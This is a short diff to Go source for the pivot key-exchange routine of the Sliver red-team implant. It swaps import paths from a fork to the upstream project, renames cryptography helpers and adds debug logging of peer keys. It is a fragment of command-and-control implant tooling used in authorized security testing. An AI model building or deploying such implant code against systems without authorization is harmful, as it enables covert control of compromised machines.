@@ -32,9 +32,9 @@ import (
 	"log"
 	// {{end}}
 
-	consts "github.com/starkzarn/glod/implant/sliver/constants"
-	"github.com/starkzarn/glod/implant/sliver/cryptography"
-	pb "github.com/starkzarn/glod/protobuf/sliverpb"
+	consts "github.com/bishopfox/sliver/implant/sliver/constants"
+	"github.com/bishopfox/sliver/implant/sliver/cryptography"
+	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 	"google.golang.org/protobuf/proto"
 )
 
@@ -403,12 +403,12 @@ func (p *NetConnPivot) peerKeyExchange() error {
 	validPeer := cryptography.MinisignVerify(peerHello.PublicKey, peerHello.PublicKeySignature)
 	if !validPeer {
 		// {{if .Config.Debug}}
-		log.Printf("[pivot] invalid peer key")
+		log.Printf("[pivot] invalid peer key: %s (sig: %s)", string(peerHello.PublicKey), peerHello.PublicKeySignature)
 		// {{end}}
 		return ErrFailedKeyExchange
 	}
 	p.downstreamPeerID = peerHello.PeerID
-	sessionKey := cryptography.RandomSymmetricKey()
+	sessionKey := cryptography.RandomKey()
 	p.cipherCtx = cryptography.NewCipherContext(sessionKey)
 	ciphertext, err := cryptography.AgeEncryptToPeer(peerHello.PublicKey, peerHello.PublicKeySignature, sessionKey[:])
 	if err != nil {
@@ -418,8 +418,8 @@ func (p *NetConnPivot) peerKeyExchange() error {
 		return ErrFailedKeyExchange
 	}
 	peerResponse, _ := proto.Marshal(&pb.PivotHello{
-		PublicKey:          []byte(cryptography.PeerAgePublicKey),
-		PublicKeySignature: cryptography.PeerAgePublicKeySignature,
+		PublicKey:          []byte(cryptography.ECCPublicKey),
+		PublicKeySignature: cryptography.ECCPublicKeySignature,
 		SessionKey:         ciphertext,
 	})
 	p.conn.SetWriteDeadline(time.Now().Add(tcpPivotWriteDeadline))
